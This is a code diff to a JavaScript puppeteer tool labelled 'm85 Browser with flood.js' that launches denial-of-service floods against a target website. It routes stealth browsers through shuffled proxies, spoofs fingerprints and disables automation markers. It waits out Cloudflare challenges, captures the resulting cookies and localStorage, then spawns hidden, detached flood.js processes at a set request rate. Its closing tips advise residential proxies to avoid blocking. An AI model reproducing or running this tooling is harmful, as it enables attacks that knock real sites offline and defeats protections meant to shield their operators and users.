@@ -8,7 +8,7 @@ puppeteer.use(StealthPlugin());
 
 // Configuration
 const MAX_RETRIES = 2;
-const TIMEOUT = 30000; // 30 seconds
+const TIMEOUT = 45000; // 45 seconds
 
 // Colors for logging
 const colors = {
@@ -111,6 +111,42 @@ async function spoofFingerprint(page) {
         Promise.resolve({ state: Notification.permission }) :
         originalQuery(parameters)
     );
+    
+    // Add fake chrome.runtime
+    window.chrome = {
+      runtime: {}
+    };
+  });
+}
+
+// Test if proxy is alive first
+async function testProxy(proxyUrl, timeout = 10000) {
+  return new Promise((resolve) => {
+    const http = require('http');
+    const https = require('https');
+    
+    const url = proxyUrl.startsWith('https') ? proxyUrl.replace('https', 'http') : proxyUrl;
+    const [host, port] = url.replace('http://', '').split(':');
+    
+    const options = {
+      host: host,
+      port: parseInt(port),
+      method: 'CONNECT',
+      path: 'sugbo.ph:443',
+      timeout: timeout
+    };
+    
+    const req = http.request(options);
+    req.on('connect', (res, socket) => {
+      socket.destroy();
+      resolve(true);
+    });
+    req.on('error', () => resolve(false));
+    req.on('timeout', () => {
+      req.destroy();
+      resolve(false);
+    });
+    req.end();
   });
 }
 
@@ -119,10 +155,36 @@ async function openBrowser(proxy, id) {
   const userAgent = getRandomUA();
   const tempDir = `./temp_profile_${id}_${Date.now()}`;
   
-  // Ensure proxy has http:// prefix
+  // Format proxy correctly
   let proxyUrl = proxy;
-  if (!proxyUrl.startsWith('http://') && !proxyUrl.startsWith('https://')) {
-    proxyUrl = `http://${proxyUrl}`;
+  let hasAuth = false;
+  
+  // Check if proxy has authentication
+  if (proxyUrl.includes('@')) {
+    hasAuth = true;
+    // Already in format user:pass@host:port
+    if (!proxyUrl.startsWith('http://') && !proxyUrl.startsWith('https://')) {
+      proxyUrl = `http://${proxyUrl}`;
+    }
+  } else {
+    // No authentication
+    if (!proxyUrl.startsWith('http://') && !proxyUrl.startsWith('https://')) {
+      proxyUrl = `http://${proxyUrl}`;
+    }
+  }
+  
+  log("info", `[${id}] Testing connection to proxy: ${proxy.split('@').pop() || proxy}`);
+  
+  // Quick proxy test
+  const isAlive = await testProxy(proxyUrl, 10000);
+  if (!isAlive) {
+    log("error", `[${id}] Proxy ${proxy.split('@').pop() || proxy} is not reachable`);
+    return {
+      success: false,
+      proxy: proxy,
+      error: "Proxy not reachable",
+      errorType: "dead_proxy"
+    };
   }
   
   const options = {
@@ -134,20 +196,39 @@ async function openBrowser(proxy, id) {
       '--no-sandbox',
       '--disable-setuid-sandbox',
       '--disable-dev-shm-usage',
-      '--disable-accelerated-2d-canvas',
       '--disable-gpu',
-      '--disable-browser-side-navigation',
+      '--disable-blink-features=AutomationControlled',
       '--disable-features=IsolateOrigins,site-per-process',
-      `--user-agent=${userAgent}`
+      '--window-size=1920,1080',
+      '--lang=en-US',
+      `--user-agent=${userAgent}`,
+      '--disable-web-security',
+      '--allow-running-insecure-content',
+      '--disable-background-networking',
+      '--disable-default-apps',
+      '--disable-extensions',
+      '--disable-sync',
+      '--disable-translate',
+      '--hide-scrollbars',
+      '--metrics-recording-only',
+      '--mute-audio',
+      '--no-first-run',
+      '--safebrowsing-disable-auto-update'
     ]
   };
   
   let browser = null;
   
   try {
-    log("info", `[${id}] Launching with proxy: ${proxy}`);
+    log("info", `[${id}] Launching browser with proxy: ${proxy.split('@').pop() || proxy}`);
     
-    browser = await puppeteer.launch(options);
+    // Launch browser with timeout
+    const browserPromise = puppeteer.launch(options);
+    const timeoutPromise = new Promise((_, reject) => 
+      setTimeout(() => reject(new Error("Browser launch timeout")), TIMEOUT)
+    );
+    
+    browser = await Promise.race([browserPromise, timeoutPromise]);
     const pages = await browser.pages();
     const page = pages[0];
     
@@ -158,22 +239,96 @@ async function openBrowser(proxy, id) {
     page.setDefaultTimeout(TIMEOUT);
     page.setDefaultNavigationTimeout(TIMEOUT);
     
-    // Add random delay to avoid detection
+    // Random delay
     await sleep(Math.random() * 2000 + 1000);
     
     log("info", `[${id}] Navigating to ${targetURL}`);
     
-    // Try to navigate
-    await page.goto(targetURL, {
-      waitUntil: 'domcontentloaded',
-      timeout: TIMEOUT
-    });
+    // Navigation with retries for connection reset
+    let navigationSuccess = false;
+    let lastError = null;
+    let pageContent = null;
+    
+    for (let attempt = 1; attempt <= 3; attempt++) {
+      try {
+        const response = await page.goto(targetURL, {
+          waitUntil: 'domcontentloaded',
+          timeout: TIMEOUT
+        });
+        
+        // Check response status
+        if (response && response.status() >= 400) {
+          log("warn", `[${id}] HTTP ${response.status()} from target`);
+        }
+        
+        navigationSuccess = true;
+        pageContent = await page.content();
+        log("success", `[${id}] Navigation succeeded on attempt ${attempt}`);
+        break;
+        
+      } catch (navError) {
+        lastError = navError;
+        log("warn", `[${id}] Attempt ${attempt}/3 failed: ${navError.message}`);
+        
+        // Check for specific errors
+        if (navError.message.includes('ERR_CONNECTION_RESET')) {
+          log("error", `[${id}] Connection reset - proxy unstable`);
+          if (attempt === 3) {
+            await browser.close();
+            try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
+            return {
+              success: false,
+              proxy: proxy,
+              error: "Connection reset - unstable proxy",
+              errorType: "unstable_proxy"
+            };
+          }
+        } else if (navError.message.includes('ERR_TIMED_OUT')) {
+          log("error", `[${id}] Timeout - proxy too slow`);
+        } else if (navError.message.includes('ERR_INVALID_AUTH')) {
+          log("error", `[${id}] Authentication failed - proxy needs user:pass`);
+          await browser.close();
+          try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
+          return {
+            success: false,
+            proxy: proxy,
+            error: "Authentication required",
+            errorType: "auth_required"
+          };
+        }
+        
+        if (attempt < 3) {
+          await sleep(5000); // Wait longer between retries
+          // Reload page if browser still works
+          try {
+            await page.reload({ timeout: 30000 });
+          } catch(e) {}
+        }
+      }
+    }
+    
+    if (!navigationSuccess) {
+      throw lastError || new Error("Navigation failed after 3 attempts");
+    }
     
     // Check for Cloudflare challenge
-    const pageContent = await page.content();
-    if (pageContent.includes("challenge-platform") || pageContent.includes("cf-browser-verification")) {
-      log("pink", `[${id}] Cloudflare challenge detected - attempting bypass`);
-      await sleep(8000); // Wait for potential auto-bypass
+    if (pageContent && (pageContent.includes("challenge-platform") || pageContent.includes("cf-browser-verification") || pageContent.includes("Just a moment"))) {
+      log("pink", `[${id}] Cloudflare challenge detected - waiting for bypass`);
+      await sleep(10000); // Wait longer for Cloudflare
+      
+      // Check again after waiting
+      const newContent = await page.content();
+      if (newContent.includes("Just a moment")) {
+        log("error", `[${id}] Cloudflare block persistent - proxy flagged`);
+        await browser.close();
+        try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
+        return {
+          success: false,
+          proxy: proxy,
+          error: "Cloudflare block detected",
+          blocked: true
+        };
+      }
     }
     
     // Get page info
@@ -184,50 +339,53 @@ async function openBrowser(proxy, id) {
     
     // Get cookies
     const cookies = await page.cookies();
-    const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+    let cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
     
-    // Check if blocked
-    if (title.includes("Just a moment") || title.includes("Attention Required")) {
-      log("warn", `[${id}] Cloudflare block detected, proxy may be flagged`);
+    // If no cookies found, try localStorage
+    if (!cookieString) {
+      const localStorage = await page.evaluate(() => {
+        return JSON.stringify(window.localStorage);
+      });
+      if (localStorage && localStorage !== '{}') {
+        cookieString = `localStorage=${Buffer.from(localStorage).toString('base64')}`;
+      }
+    }
+    
+    // Check if flood.js exists
+    if (!fs.existsSync("flood.js")) {
+      log("error", `[${id}] flood.js not found!`);
       await browser.close();
-      
-      // Cleanup temp directory
-      try {
-        fs.rmSync(tempDir, { recursive: true, force: true });
-      } catch(e) {}
-      
+      try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
       return {
         success: false,
         proxy: proxy,
-        error: "Cloudflare block detected",
-        blocked: true
+        error: "flood.js not found"
       };
     }
     
-    // Success! Now spawn flood.js
-    log("success", `[${id}] ✅ Starting flood.js with proxy: ${proxy}`);
+    // Spawn flood.js process
+    log("success", `[${id}] ✅ Spawning flood.js with proxy: ${proxy.split('@').pop() || proxy}`);
     
-    // Prepare arguments for flood.js
     const floodArgs = [
       "flood.js",
       targetURL,
       "100",        // connections
-      "2",          // threads per flood
-      proxy,        // proxy
+      "2",          // threads
+      proxy,        // proxy (keep original format)
       rates,        // rate
       cookieString, // cookies
       userAgent     // user agent
     ];
     
-    log("info", `[${id}] Spawning: node ${floodArgs.join(' ')}`);
+    log("info", `[${id}] Command: node ${floodArgs.slice(0, 5).join(' ')} ...`);
     
-    // Spawn flood.js process
+    // Spawn flood.js process detached
     const floodProcess = spawn("node", floodArgs, {
       detached: true,
-      stdio: 'ignore'
+      stdio: 'ignore',
+      windowsHide: true
     });
     
-    // Detach the process so it continues even if browser closes
     floodProcess.unref();
     
     log("success", `[${id}] flood.js started with PID: ${floodProcess.pid}`);
@@ -244,7 +402,7 @@ async function openBrowser(proxy, id) {
       success: true,
       proxy: proxy,
       title: title,
-      cookies: cookieString,
+      cookies: cookieString.substring(0, 200) + "...",
       userAgent: userAgent,
       pid: floodProcess.pid
     };
@@ -261,10 +419,18 @@ async function openBrowser(proxy, id) {
       fs.rmSync(tempDir, { recursive: true, force: true });
     } catch(e) {}
     
+    // Determine error type
+    let errorType = "unknown";
+    if (error.message.includes('ERR_CONNECTION_RESET')) errorType = "connection_reset";
+    if (error.message.includes('ERR_TIMED_OUT')) errorType = "timeout";
+    if (error.message.includes('ERR_INVALID_AUTH')) errorType = "auth_error";
+    if (error.message.includes('ECONNREFUSED')) errorType = "connection_refused";
+    
     return {
       success: false,
       proxy: proxy,
-      error: error.message
+      error: error.message,
+      errorType: errorType
     };
   }
 }
@@ -273,14 +439,20 @@ async function openBrowser(proxy, id) {
 async function worker(proxy, id, retries = 0) {
   const result = await openBrowser(proxy, id);
   
-  if (!result.success && retries < MAX_RETRIES) {
-    log("warn", `[${id}] Retry ${retries + 1}/${MAX_RETRIES} for ${proxy}`);
+  // Don't retry certain error types
+  const noRetryErrors = ['auth_required', 'dead_proxy', 'connection_refused'];
+  
+  if (!result.success && retries < MAX_RETRIES && !noRetryErrors.includes(result.errorType)) {
+    log("warn", `[${id}] Retry ${retries + 1}/${MAX_RETRIES} for ${proxy.split('@').pop() || proxy}`);
     await sleep(3000);
     return worker(proxy, id, retries + 1);
   }
   
   return result;
 }
+
+// Store flood processes for tracking
+const floodProcesses = [];
 
 // Kill all flood.js processes on exit
 function cleanup() {
@@ -300,19 +472,19 @@ function cleanup() {
         log("error", `Error killing flood.js: ${err.message}`);
       }
     });
-    exec('pkill -f chrome', (err) => {
-      if (err && err.code !== 1) {
-        log("error", `Error killing chrome: ${err.message}`);
-      }
-    });
   }
+  
+  log("success", "Cleanup complete");
 }
 
 // Main function
 async function main() {
+  log("info", `╔════════════════════════════════════════╗`);
+  log("info", `║     m85 Browser with flood.js         ║`);
+  log("info", `╚════════════════════════════════════════╝`);
   log("info", `Target: ${targetURL}`);
   log("info", `Threads: ${threads}`);
-  log("info", `Rate: ${rates}`);
+  log("info", `Rate: ${rates} req/sec`);
   log("info", `Duration: ${duration} seconds`);
   log("info", `Total proxies: ${proxies.length}`);
   
@@ -323,6 +495,12 @@ async function main() {
     process.exit(1);
   }
   
+  // Shuffle proxies for better distribution
+  for (let i = proxies.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [proxies[i], proxies[j]] = [proxies[j], proxies[i]];
+  }
+  
   // Create a queue of proxies
   const proxyQueue = [...proxies];
   let activeThreads = 0;
@@ -330,7 +508,7 @@ async function main() {
   let successCount = 0;
   let failCount = 0;
   let blockedCount = 0;
-  const spawnedProcesses = [];
+  let unstableCount = 0;
   
   // Process function
   async function processProxy(proxy, id) {
@@ -341,19 +519,23 @@ async function main() {
     
     if (result.success) {
       successCount++;
-      if (result.pid) spawnedProcesses.push(result.pid);
-      log("success", `[${id}] ✅ SUCCESS - Proxy: ${proxy} | flood.js PID: ${result.pid}`);
+      if (result.pid) floodProcesses.push(result.pid);
+      log("success", `[${id}] ✅ SUCCESS - Proxy: ${proxy.split('@').pop() || proxy} | flood.js PID: ${result.pid}`);
     } else if (result.blocked) {
       blockedCount++;
-      log("error", `[${id}] 🚫 BLOCKED - Proxy: ${proxy} (Cloudflare)`);
+      log("error", `[${id}] 🚫 CLOUDFLARE BLOCK - Proxy: ${proxy.split('@').pop() || proxy}`);
+    } else if (result.errorType === "unstable_proxy" || result.errorType === "connection_reset") {
+      unstableCount++;
+      log("error", `[${id}] ⚠ UNSTABLE PROXY - ${proxy.split('@').pop() || proxy} | ${result.error}`);
     } else {
       failCount++;
-      log("error", `[${id}] ❌ FAILED - Proxy: ${proxy} | Error: ${result.error}`);
+      log("error", `[${id}] ❌ FAILED - Proxy: ${proxy.split('@').pop() || proxy} | ${result.error}`);
     }
     
-    // Log progress
-    if (completed % 10 === 0 || completed === proxies.length) {
-      log("info", `Progress: ${completed}/${proxies.length} | Success: ${successCount} | Blocked: ${blockedCount} | Failed: ${failCount}`);
+    // Log progress every 5 proxies
+    if (completed % 5 === 0 || completed === proxies.length) {
+      const successRate = ((successCount / completed) * 100).toFixed(1);
+      log("info", `📊 Progress: ${completed}/${proxies.length} | ✅ ${successCount} | 🚫 ${blockedCount} | ⚠ ${unstableCount} | ❌ ${failCount} | (${successRate}% success)`);
     }
     
     // Process next proxy if available
@@ -367,9 +549,12 @@ async function main() {
   
   // Set up cleanup on exit
   process.on('SIGINT', () => {
-    log("warn", "Interrupt received, cleaning up...");
+    log("warn", "\n⚠ Interrupt received, cleaning up...");
     cleanup();
-    setTimeout(() => process.exit(0), 2000);
+    setTimeout(() => {
+      log("success", "Goodbye!");
+      process.exit(0);
+    }, 2000);
   });
   
   // Start initial threads
@@ -379,23 +564,51 @@ async function main() {
     processProxy(proxy, i + 1);
   }
   
-  // Wait for duration
-  log("info", `Running for ${duration} seconds...`);
-  await sleep(duration * 1000);
+  // Wait for duration or completion
+  log("info", `⏱ Running for ${duration} seconds...`);
+  
+  const endTime = startTime + (duration * 1000);
+  const interval = setInterval(() => {
+    const remaining = Math.ceil((endTime - Date.now()) / 1000);
+    if (remaining % 10 === 0 && remaining > 0) {
+      log("info", `⏱ Time remaining: ${remaining} seconds`);
+    }
+  }, 10000);
+  
+  // Wait until duration expires or all proxies processed
+  while (Date.now() < endTime && (proxyQueue.length > 0 || activeThreads > 0)) {
+    await sleep(1000);
+  }
+  
+  clearInterval(interval);
   
   // Stop and cleanup
-  log("warn", "Time limit reached, stopping...");
+  log("warn", "\n⏱ Time limit reached or all proxies processed, stopping...");
   cleanup();
   
-  // Final statistics
-  await sleep(2000);
+  // Wait for cleanup
+  await sleep(3000);
   
-  log("success", `\n${colors.green}=== FINAL RESULTS ===${colors.reset}`);
-  log("success", `Total tested: ${completed}`);
-  log("success", `Successful (flood.js spawned): ${successCount}`);
-  log("error", `Blocked by Cloudflare: ${blockedCount}`);
-  log("error", `Failed (other errors): ${failCount}`);
-  log("success", `Success rate: ${((successCount / completed) * 100).toFixed(2)}%`);
+  // Final statistics
+  log("info", "\n╔════════════════════════════════════════╗");
+  log("info", "║           FINAL RESULTS                ║");
+  log("info", "╚════════════════════════════════════════╝");
+  log("success", `Total proxies tested: ${completed}`);
+  log("success", `✅ Successful (flood.js spawned): ${successCount}`);
+  log("error", `🚫 Blocked by Cloudflare: ${blockedCount}`);
+  log("error", `⚠ Unstable/Connection Reset: ${unstableCount}`);
+  log("error", `❌ Failed (other errors): ${failCount}`);
+  log("success", `📈 Success rate: ${((successCount / completed) * 100).toFixed(2)}%`);
+  
+  if (successCount > 0) {
+    log("success", `🎯 ${successCount} flood.js processes were spawned successfully`);
+  } else {
+    log("error", "💀 No successful connections! You need better quality proxies.");
+    log("error", "Tips:");
+    log("error", "  - Use residential proxies instead of datacenter");
+    log("error", "  - Avoid free proxies (they're mostly dead)");
+    log("error", "  - Check proxy format: ip:port or user:pass@ip:port");
+  }
   
   process.exit(0);
 }
